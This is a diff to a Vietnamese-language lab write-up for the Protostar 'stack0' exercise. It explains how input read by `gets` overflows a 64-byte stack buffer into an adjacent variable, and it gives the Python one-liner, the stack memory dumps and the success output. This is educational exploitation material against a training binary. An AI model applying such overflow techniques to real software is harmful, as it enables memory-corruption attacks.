@@ -55,7 +55,7 @@ Khi đọc qua source code và cả asm của `main`, hãy lưu ý nhưng điề
 
 Từ 2 lưu ý trên, ta thấy được biến `buffer` và `modified` nằm kề nhau.
 2 biến này sẽ chiếm bộ nhớ từ `esp + 0x1c` cho đến hết `esp + 0x5f`.
-Ở đây, giá trị của biến `buffer`được người dùng quyết định thông qua hàm `gets`.
+Ở đây, giá trị của biến `buffer` được người dùng quyết định thông qua hàm `gets`.
 Stack overflow sẽ xảy ra khi người dùng nhập giá trị cho `buffer` nhưng lại vượt quá độ dài 64 byte của biến đó.
 Khi đó, phần dư sẽ được lưu đè lên vùng bộ nhớ kế tiếp.
 
@@ -70,7 +70,16 @@ Phân biệt theo màu: <span style="color:aqua">buffer</span> và <span style="
 0xbffff790:     <span style="color:aqua">0xb7ec6365</span>      <span style="color:aqua">0xb7ff1040</span>      <span style="color:aqua">0x0804845b</span>      <span style="color:orangered">0x00000000</span>
 </pre>
 
-and after:
+Như vậy chỉ cần nhập chuỗi có độ dài ít nhất 65 byte thì giá trị của `modified` sẽ được thay đổi.
+Sau đây là một ví dụ. Lưu ý, ở đây mình dùng file `input.txt` để lưu giá trị nhập vào.
+
+```bash
+python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888' + 'x'" > input.txt
+stack0 < input.txt
+```
+
+Phần chuỗi `"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888"` sẽ chiếm hết 64 byte của `buffer`. `"x"`, tương đương `0x78` sẽ được dành cho `modified`.
+Thay đổi trên bộ nhớ có thể thấy được như sau:
 <pre>
 0xbffff740:     0xbffff75c      0x00000001      0xb7fff8f8      0xb7f0186e
 0xbffff750:     0xb7fd7ff4      0xb7ec6165      0xbffff768      <span style="color:aqua">0x41414141</span>
@@ -80,10 +89,10 @@ and after:
 0xbffff790:     <span style="color:aqua">0x36363636</span>      <span style="color:aqua">0x37373737</span>      <span style="color:aqua">0x38383838</span>      <span style="color:orangered">0x00000078</span>
 </pre>
 
-buffer value:
+## Ref
 ```bash
-python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888' + 'x'" > input.txt
+user@protostar:~$ python -c "print 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH11112222333344445555666677778888' + 'x'" > input.txt
+user@protostar:~$ stack0 < input.txt
+you have changed the 'modified' variable
 ```
-stack0 < input.txt
-
 [back](./)
